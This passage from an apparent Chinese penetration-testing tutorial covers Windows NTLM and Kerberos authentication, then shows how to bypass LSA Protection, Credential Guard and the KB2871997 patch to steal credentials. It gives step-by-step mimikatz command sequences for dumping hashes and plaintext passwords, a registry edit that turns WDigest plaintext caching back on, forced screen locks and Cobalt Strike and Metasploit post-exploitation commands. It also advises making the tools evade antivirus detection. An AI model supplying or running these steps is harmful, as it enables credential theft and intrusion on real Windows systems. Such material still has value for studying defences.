ID为：500
LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE
NT-HASH值为：683020925C5D8569C23AA724774CE6CC
###  八、Windows本地认证和网络认证简述：
1.windows 本地认证原理：
注销或开机后：弹出输入账号密码的界面，用于接受用户输入 （实际会有个本地进程：winlogon.exe进程，用于管理用户的登陆和退出）。
  * 进程（1）：winlogon.exe进程，将账号密码给lsass.exe进程进行处理，并将密码缓存在进程中；
  * 进程（2）：lsass.exe进程，将密码转换为NTML HASH，读取SAM数据库与用户名进行比较；
  * 若比较结果相同，则将User SID与Group SID发给winlogon.exe，并准备登陆界面；若比较结果不同，则登陆失败。
2.Windows 网络认证原理：
  * 工作组的环境是一个逻辑上的网络环境（工作区），隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是较为落后的认证方式，没有信托机构。
  * 假设A主机与B主机在一个工作主组环境，A想要访问B主机上的资源，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能访问B主机上的资源。传输数据由协议来规范数据如何传递，最常见的服务：SMB服务 端口445。
3.windows 本地认证流程
Windows 本地认证 挑战和响应机制（NTLM v2）
**第一步：协商：**
确定协议版本是v1还是v2
**第二步：质询：**
（1）服务器判断用户是否存在：
客户端向服务器端发送用户主机信息（必须包含用户名），服务器用客户端请求的用户名来判断服务器内是否有这个用户；
若没有这个用户，那么认证过程就是失败的；若有，则继续：
（2）服务器生成16位Challenge：
服务器接受到请求之后生成一个16位随机数Challenge，服务器使用登录用户名对应的NTLM HASH；
（3）服务器生成Net NTLM HASH：
服务器用本机SAM文件数据库内NTLM HASH 加密 16位随机数 Challenge生成Challenge1 即“Net NTLM HASH”；
（4）服务器返回16位Challenge：
服务器将之前生成的16位随机数Challenge再发送给客户端；
（5）客户端生成Response：
客户端接受到Challenge之后，使用将要登陆到账户对应的NTLM HASH加密Challenge生成Response，然后将Response发送到服务端
；
**第三步：验证：**
（6）服务端比对Response是否等于Net NTLM HASH：
比对服务器端收到客户端的Response后，比对NET NTLM HASH与Response是否相等，相等则通过。
###  九、Kerberos 协议简述：
Kerberos实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、修改和插入数据。作为一种可信任的第三方认证服务，是通过传统的密码技术执行认证服务的（如：共享密钥）。
**常见端口：**
TCP和UDP的88端口：身份验证和票证授予
TCP和UDP的464端口：经典的Kerberos Kpasswd（密码重设）协议
LDAP：389、636
**Kerberos认证名词：**
  * AS：身份认证服务（验证Client身份）
  * KDC：密钥分发中心（域控制器）
  * TGT：用来进行认证的认证票据
  * TGS：票据授权服务
  * ST：访问服务的票据
  * Krbtgt：每个域内都有krbtgt账户，此账户是KDC的服务账户用来创建TGT
  * Principal：认证主体
  * PAC：特权属性证书
  * Session Key /Short-term Key（短期会话密钥)
  * Server Session Key（短期密钥)
**认证流程（此处是简述过程，方便理解）：**
Client-A（客户端）、Server-B（服务端）、KDC（域控制器）
（1）Client请求域控制器(KDC)的身份认服务(AS)拿到认证票据(TGT)
（2）Client拿着认证票据(TGT)去请求与控制器(KDC)的票据授权(TGS)服务拿到访问服务的票据（ST）
（3）client拿着用于访问服务的票据(ST)去访问Server，然后完成整个过程
如图：
## 0x02 Windows保护机制浅谈以及bypass
###  一、LSA Protection（LSA保护）：
自Windows 8.1 开始为LSA提供了额外的保护（LSA
Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA
Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。
注册表位置开启LSA保护，然后重启系统生效。
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "00000001" /f
测试环境：此处目标机是Windows 10 x64
1.验证目标机器是否开启了LSA保护，此处可以看到目标主机开启了LSA保护：
查看系统日志，事件id为12-LSASS.exe作为受保护的进程启动：
2.LSA Protection运行下的sekurlsa::logonpasswords：
在开启LSA Protection保护时，mimikatz运行 sekurlsa::logonpasswords会报错 “ERROR
kuhl_m_sekurlsa_acquireLSA；Handle on memery”
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
3.bypass 方法1：
mimikatz 运行 lsadump :: sam 从磁盘上的SAM读取凭据，可成功pypass LSA Protection，读取到用户哈希
    mimikatz # privilege::debug
    mimikatz # token::whoami
    mimikatz # token::elevate
    mimikatz # lsadump::sam
4.bypass 方法2：
mimikatz其中的mimidrv.sys驱动程序，可从lsass.exe进程中删除LSA保护，成功pypass LSA 保护。
    mimikatz # privilege::debug
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    mimikatz # sekurlsa::logonpasswords
此处遇到一个坑，这里报错`ERROR kuhl_m_sekurlsa_acquireLSA ; Key import` 而且在1908
2004版本上均会出现此错误，最新版的mimikatz也会出现错误，这里的解决办法是用老版本的mimikatz（此处注意我使用的mimikatz的版本号）
###  二、Credential Guard（虚拟化保护）
在Windows 10和Windows Server 2016中，Microsoft启用Credential
Guard（凭据防护），使用基于虚拟化技术来保护和隔离lsass进程，以保护凭证。启用Credential
Guard后，lsass包含2个进程：正常LSA进程和隔离LSA进程（在VSM中运行）
测试环境：此处目标机是Windows 10 x64
1.开启Credential Guard 保护：
在组策略管理控制台中，在”计算机配置” -> “管理模板” -> “系统” -> “Device
Guard”，打开”打开基于虚拟化的安全”，选择”已启用”；  
在”选择平台安全级别”框中，选择”安全启动”或”安全启动和DMA保护”；  
在”凭据保护配置”框中，选择”使用UEFI锁启用”。  
运行gpupdate /force 强制执行组策略
验证Windows Defender Credential Guard是否运行：  
输入msinfo32.exe，在 ”系统摘要”-> ”已配置基于虚拟化的安全服务”处，可看到显示”Credential Guard”
2.Credential Guard运行下的sekurlsa::logonpasswords
在开启Credential Guard后， 运行 mimikatz
`sekurlsa::logonpasswords`，可以抓到部分用户哈希，但是存在缺陷：抓取到的用户不全，有遗漏，抓不到密码明文
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
只抓取其中一个用户jerry的哈希，缺失了用户jerry2，并且没有了之前的明文：
3.bypass方法1
mimikatz 运行 lsadump :: sam 从磁盘上的SAM读取凭据，可成功bypass Credential Guard，读取到全部的用户哈希
    mimikatz # privilege::debug
    mimikatz # token::whoami
    mimikatz # token::elevate
    mimikatz # lsadump::sam
新增抓到了用户jerry2的哈希：
4.bypass方法2
SSP在用户登录时被调用，并接收该用户的凭据。在系统启动时SSP会被加载到进程lsass.exe中。
Mimikatz可通过内存安装自定义的ssp，修改lsass进程的内存，实现从lsass进程中提取凭据，mimikatz执行`misc::memssp`后，可以通过锁屏后重新登录来抓取，将会在c:\windows\system32下生成文件mimilsa.log，其中保存有用户明文密码。
    mimikatz # privilege::debug
    mimikatz # misc::memssp
锁屏命令：`rundll32.exe user32.dll LockWorkStation`
锁屏后，重新登陆，成功记录到用户密码明文：
此外还可以尝试mimikatz的 `lsadump::secrets` 从注册表中获取syskey信息来解密，从而bypass LSA
Protection和Credential Guard。
###  三、kb2871997补丁
kb2871997主要用来防止pth攻击，限制了两个sid（kb2871997会删除除了*wdigest
ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用）
  * S-1-5-1 13(NT AUTHORITY Local account) 账户
  * S-1-5-1 14(NT AUTHORITY Administrators)账户和管理员组的成员
  * 可以通过组策略使用这些sid来有效地阻止远程登录使用所有本地管理帐户
bypass方法：
1.修改注册表实现，需要重启：
`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v
UseLogonCredential /t REG_DWORD /d 1 /f`
2.锁屏实现：
    rundll32.exe user32.dll LockWorkStation
3.使用截屏、键盘记录等后渗透功能，一般都要到对应用户的空间下操作
    //cs
    desktop [explorer pid] x86|x64 low |higt
    //msf
    migrate [explorer pid]
    screenshot
## 0x04 小结
简单总结一下就是如下：
1.主要是获取内存文件lsass.exe进程中存储的明文登陆密码
2.关于一些抓hash的工具，主要是利用了windows自带的mimidump接口，进行dump文件
3.在win10或者2012R2以上的系统中，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时我们要获取明文，就需要修改注册表、强制锁屏、等待目标系统管理员重新登陆或者使用键盘记录，我们才能抓取到明文密码
4.在实际渗透环境中，我们着重要考虑的是目标系统的系统版本，然后针对性的去抓系统的hash，切记一定要做好免杀处理，不然上传直接被秒
**注** ：必须是拿到了admin权限的cmd,有UAC必须先bypass
UAC，必须是管理员用密码登陆机器，并运行了lsass.exe进程，把密码保存在内存文件的lsass进程中。
## 0x05参考链接